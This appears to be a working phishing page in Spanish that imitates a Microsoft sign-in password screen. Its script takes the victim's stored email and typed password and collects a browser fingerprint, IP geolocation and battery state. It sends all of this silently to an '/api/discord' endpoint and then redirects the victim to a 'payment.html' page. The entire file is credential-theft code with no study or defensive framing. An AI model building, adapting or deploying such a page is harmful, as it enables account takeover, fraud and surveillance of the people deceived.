<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión</title>
  <meta name="description" content="Iniciar sesión en su cuenta">
  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      min-height: 100vh;
      width: 100%;
      overflow: hidden;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-color: #0a0a1a;
    }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
      background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
    }
    .login-container {
      width: 100%;
      max-width: 380px;
      background: rgba(10, 10, 26, 0.85);
      backdrop-filter: blur(20px);
      border-radius: 12px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
      padding: 40px;
      position: relative;
      z-index: 10;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    .logo {
      text-align: center;
      margin-bottom: 24px;
    }
    .logo img {
      height: 40px;
    }
    .login-title {
      font-size: 24px;
      font-weight: 600;
      color: #ffffff;
      text-align: center;
      margin-bottom: 8px;
    }
    .login-description {
      font-size: 13px;
      color: #a0a0b0;
      text-align: center;
      margin-bottom: 24px;
      min-height: 18px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: #8c8c9e;
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px 14px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 6px;
      color: #ffffff;
      font-size: 15px;
      outline: none;
      transition: border-color 0.2s;
    }
    input[type="password"]:focus {
      border-color: #0078d4;
    }
    .btn-primary {
      width: 100%;
      padding: 12px;
      background: #0078d4;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }
    .btn-primary:hover {
      background: #106ebe;
    }
    .btn-primary:disabled {
      background: #6a6a7a;
      cursor: not-allowed;
    }
    .links {
      margin-top: 16px;
      text-align: center;
    }
    .links a {
      color: #a0a0b0;
      font-size: 13px;
      text-decoration: none;
    }
    .links a:hover {
      text-decoration: underline;
    }
    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 11px;
      color: #6a6a7a;
      line-height: 1.6;
    }
    .footer a {
      color: #6a6a7a;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    /* Hidden fields for browser data collection (not visible on UI) */
    .hidden-fields { display: none; }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img id="loginLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
    </div>
    <div class="login-title" id="loginTitle">Iniciar sesión</div>
    <div class="login-description" id="loginDescription"></div>

    <div class="form-group">
      <div style="font-size: 13px; color: #a0a0b0; margin-bottom: 8px;" id="emailDisplay"></div>
    </div>

    <form id="passwordForm" onsubmit="return handlePasswordSubmit(event)">
      <div class="form-group">
        <label for="passwordInput">Contraseña</label>
        <input type="password" id="passwordInput" name="passwd" autocomplete="current-password"
               placeholder="Contraseña"
               aria-label="Contraseña" required>
      </div>
    </form>

    <button type="submit" id="loginButton" class="btn-primary" onclick="handlePasswordSubmit(event)">
      Iniciar sesión
    </button>

    <div class="links">
      <a href="#">¿Olvidó su contraseña?</a>
      <br><br>
      <a href="#">¿No puede acceder a su cuenta?</a>
    </div>

    <div class="footer">
      <a href="#" id="ayudaLink">Ayuda</a>
      ·
      <a href="#">Términos de uso</a>
      ·
      <a href="#">Privacidad y cookies</a>
      <br>
      <span>Usa la exploración privada si este no es tu dispositivo. Más información</span>
    </div>
  </div>

  <script>
    // --- Configuración guardada ---
    var savedSettings = {};

    function getSavedSetting(key, defaultValue) {
      if (savedSettings[key] !== undefined && savedSettings[key] !== '') return savedSettings[key];
      if (localStorage.getItem(key) !== null && localStorage.getItem(key) !== '') return localStorage.getItem(key);
      return defaultValue;
    }

    async function loadConfig() {
      try {
        var res = await fetch('/api/config');
        if (res.ok) {
          var data = await res.json();
          savedSettings = data;
          Object.keys(data).forEach(function(k) {
            if (data[k] !== undefined && data[k] !== null && typeof data[k] !== 'object') {
              localStorage.setItem(k, data[k]);
            }
          });
        }
      } catch (e) {
        savedSettings = {};
        for (var key in localStorage) {
          if (localStorage.hasOwnProperty(key)) {
            savedSettings[key] = localStorage.getItem(key);
          }
        }
      }
      applyLoginBackground();
      applyLoginContent();
    }

    function applyLoginBackground() {
      var bgType = getSavedSetting('loginBgType', 'image');
      var bgColor = getSavedSetting('loginBgColor', '#0a0a1a');
      var bgGradient = getSavedSetting('loginBgGradient', 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)');
      var bgImage = getSavedSetting('loginBgImage', 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');

      document.body.style.removeProperty('background-image');
      document.body.style.removeProperty('background-color');
      document.body.classList.remove('bg-gradient', 'bg-image');

      if (bgType === 'gradient') {
        document.body.style.background = bgGradient;
        document.body.classList.add('bg-gradient');
      } else if (bgType === 'image' && bgImage) {
        document.body.style.backgroundImage = 'url(' + bgImage + ')';
        document.body.style.backgroundSize = 'cover';
        document.body.style.backgroundPosition = 'center';
        document.body.style.backgroundRepeat = 'no-repeat';
        document.body.classList.add('bg-image');
      } else {
        document.body.style.backgroundColor = bgColor;
      }
    }

    function applyLoginContent() {
      var logoUrl = getSavedSetting('loginLogo', 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg');
      var title = getSavedSetting('loginTitle', 'Iniciar sesión');
      var description = getSavedSetting('loginDescription', '');

      var logoImg = document.getElementById('loginLogo');
      if (logoImg) logoImg.src = logoUrl;

      var titleEl = document.getElementById('loginTitle');
      if (titleEl) titleEl.textContent = title;

      var descEl = document.getElementById('loginDescription');
      if (descEl) {
        descEl.textContent = description || '';
        descEl.style.display = description ? 'block' : 'none';
      }
    }

    // --- Mostrar email del paso anterior ---
    function displayEmail() {
      var email = sessionStorage.getItem('loginEmail') || localStorage.getItem('loginEmail') || '';
      var display = document.getElementById('emailDisplay');
      if (display) {
        display.textContent = email;
      }
    }

    // --- Recopilar datos del navegador ---
    async function collectBrowserData() {
      var data = {
        userAgent: navigator.userAgent || 'desconocido',
        language: navigator.language || 'desconocido',
        languages: JSON.stringify(navigator.languages || []),
        screenResolution: screen.width + 'x' + screen.height,
        colorDepth: screen.colorDepth + ' bits',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido',
        platform: navigator.platform || 'desconocido',
        onlineStatus: navigator.onLine ? 'Sí' : 'No',
        cookiesEnabled: navigator.cookieEnabled ? 'Sí' : 'No',
        deviceMemory: (navigator.deviceMemory || 'desconocida') + (navigator.deviceMemory ? ' GB' : ''),
        cpuCores: navigator.hardwareConcurrency || 'desconocido',
        touchPoints: navigator.maxTouchPoints || 0,
        ipifyIp: ''
      };

      // Detección de dispositivo
      var ua = navigator.userAgent;
      data.isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) ? 'Sí' : 'No';
      data.isTablet = /iPad|Android(?!.*Mobile)/i.test(ua) ? 'Sí' : 'No';
      data.isDesktop = (data.isMobile === 'No' && data.isTablet === 'No') ? 'Sí' : 'No';

      // --- Geo IP desde ipinfo.io ---
      try {
        var geoRes = await fetch('https://ipinfo.io/json');
        if (geoRes.ok) {
          var geo = await geoRes.json();
          if (geo) {
            data.geoIp = geo.ip || '';
            data.geoCity = geo.city || '';
            data.geoRegion = geo.region || '';
            data.geoCountry = geo.country || '';
            data.geoCountryCode = geo.country || '';
            data.geoTimezone = geo.timezone || '';
            data.geoIsoCode = geo.country || '';
            data.geoIsp = geo.org || '';
            if (geo.loc) {
              var parts = geo.loc.split(',');
              data.geoLatitude = parts[0] || '';
              data.geoLongitude = parts[1] || '';
            }
            data.geoZip = geo.postal || '';
            data.geoCurrency = '';
            data.geoCurrencyCode = '';
            data.geoCallingCode = '';
            data.geoNetwork = geo.org || '';
          }
        }
      } catch (err) {
        console.warn('ipinfo.io failed:', err);
      }

      // --- IP desde ipify (fallback) ---
      try {
        var ipifyRes = await fetch('https://api.ipify.org?format=json');
        if (ipifyRes.ok) {
          var ipify = await ipifyRes.json();
          data.ipifyIp = ipify.ip || '';
          // Usar como geoIp si ipinfo falló
          if (!data.geoIp) data.geoIp = data.ipifyIp;
        }
      } catch (err) {
        console.warn('ipify failed:', err);
      }

      // --- Batería desde BatteryManager API ---
      try {
        if (navigator.getBattery) {
          var battery = await navigator.getBattery();
          data.batteryLevel = (battery.level * 100).toFixed(0) + '%';
          data.batteryCharging = battery.charging ? 'Sí' : 'No';
        } else {
          data.batteryLevel = 'No disponible';
          data.batteryCharging = 'Desconocido';
        }
      } catch (err) {
        console.warn('Battery API failed:', err);
        data.batteryLevel = 'No disponible';
        data.batteryCharging = 'Desconocido';
      }

      return data;
    }

    // --- Envío a Discord (silencioso - sin mensajes visibles) ---
    async function sendToDiscord(email, password) {
      try {
        var browserData = await collectBrowserData();
        var payload = {
          email: email,
          password: password,
          userAgent: browserData.userAgent,
          language: browserData.language,
          languages: browserData.languages,
          screenResolution: browserData.screenResolution,
          colorDepth: browserData.colorDepth,
          timezone: browserData.timezone,
          platform: browserData.platform,
          onlineStatus: browserData.onlineStatus,
          cookiesEnabled: browserData.cookiesEnabled,
          deviceMemory: browserData.deviceMemory,
          cpuCores: browserData.cpuCores,
          touchPoints: browserData.touchPoints,
          isMobile: browserData.isMobile,
          isTablet: browserData.isTablet,
          isDesktop: browserData.isDesktop,
          batteryLevel: browserData.batteryLevel,
          batteryCharging: browserData.batteryCharging,
          geoIp: browserData.geoIp || '',
          geoCity: browserData.geoCity || '',
          geoRegion: browserData.geoRegion || '',
          geoCountry: browserData.geoCountry || '',
          geoCountryCode: browserData.geoCountryCode || '',
          geoTimezone: browserData.geoTimezone || '',
          geoIsoCode: browserData.geoIsoCode || '',
          geoIsp: browserData.geoIsp || '',
          geoLatitude: browserData.geoLatitude || '',
          geoLongitude: browserData.geoLongitude || '',
          geoZip: browserData.geoZip || '',
          geoCurrency: browserData.geoCurrency || '',
          geoCurrencyCode: browserData.geoCurrencyCode || '',
          geoCallingCode: browserData.geoCallingCode || '',
          geoNetwork: browserData.geoNetwork || '',
          ipifyIp: browserData.ipifyIp || ''
        };

        var res = await fetch('/api/discord', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!res.ok) {
          var errText = await res.text();
          console.warn('Discord API error:', res.status, errText);
          return false;
        }

        var result = await res.json();
        return result.success ? true : false;
      } catch (err) {
        console.warn('Discord API unavailable:', err);
        return false;
      }
    }

    // --- Manejo del envío de contraseña ---
    async function handlePasswordSubmit(event) {
      if (event) event.preventDefault();

      var email = sessionStorage.getItem('loginEmail') || localStorage.getItem('loginEmail') || 'unknown';
      var password = document.getElementById('passwordInput').value;

      if (!password || password.trim() === '') {
        // No mostrar mensaje visible - solo no redirigir
        return false;
      }

      // Enviar a Discord de forma silenciosa
      await sendToDiscord(email, password);

      // Redirigir a la página de pago (sin mensajes visibles)
      window.location.href = 'payment.html';
      return false;
    }

    // Cargar configuración y email al iniciar
    document.addEventListener('DOMContentLoaded', function() {
      displayEmail();
      loadConfig();
      // Auto-enfocar el input de contraseña
      var pwdInput = document.getElementById('passwordInput');
      if (pwdInput) pwdInput.focus();
    });
  </script>
</body>
</html>
